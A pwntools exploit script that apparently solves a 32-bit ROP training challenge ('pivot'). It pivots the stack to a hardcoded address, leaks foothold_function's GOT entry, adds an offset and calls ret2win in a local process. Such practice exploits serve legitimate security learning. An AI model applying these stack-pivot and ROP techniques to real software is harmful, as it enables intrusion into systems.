from pwn import *
import pdb

pivot = ELF("./pivot32")
libpivot = ELF("./libpivot32.so")

gadgets_base = pivot.symbols["usefulGadgets"]
foothold_function = pivot.symbols["plt.foothold_function"] # foothold_function@plt
offset_ret2win = libpivot.symbols["ret2win"]
offset_foothold = libpivot.symbols["foothold_function"]

ret2win_function_offset = offset_ret2win - offset_foothold
foothold_function_got_plt = pivot.symbols["got.foothold_function"]



# gadgets
pop_eax = gadgets_base + 0 # pop eax; ret
xchg_esp_eax = gadgets_base + 2 # xchg esp,eax; ret
mov_eax_ptreax = gadgets_base + 4 # mov eax, DWORD PTR [eax]; ret
add_eax_ebx = gadgets_base + 7 # add eax,ebx; ret
pop_ebx = pivot.symbols["_init"] + 33 # pop ebx; ret
call_eax = pivot.symbols["deregister_tm_clones"] + 35 # call eax

begin_payload = 0xf7dfcf08 # this is where our payload will be stored at


# step 0: stack pivot chain

stackpivotchain = ""
stackpivotchain += p32(pop_eax)
stackpivotchain += p32(begin_payload)
stackpivotchain += p32(xchg_esp_eax)

# step 1: call foothold_function

ropchain = ""
ropchain += p32(foothold_function)

# step 2: overwrite foothold function

ropchain += p32(pop_eax)
ropchain += p32(foothold_function_got_plt) # eax holds now the address of the foothold_function got plt entry
ropchain += p32(mov_eax_ptreax) # eax contains now the contents of the foothold_function got plt entry
ropchain += p32(pop_ebx) # ebx contains now the offset to the ret2win function
ropchain += p32(ret2win_function_offset)
ropchain += p32(add_eax_ebx) # eax contains now the final address to the ret2win function
ropchain += p32(call_eax) # call ret2win


payload = ropchain
payload += (299 - len(ropchain)) *"B" # filler bytes to reach the point of EIP control
payload += stackpivotchain






io = pivot.process()

io.sendline(payload)

io.interactive()
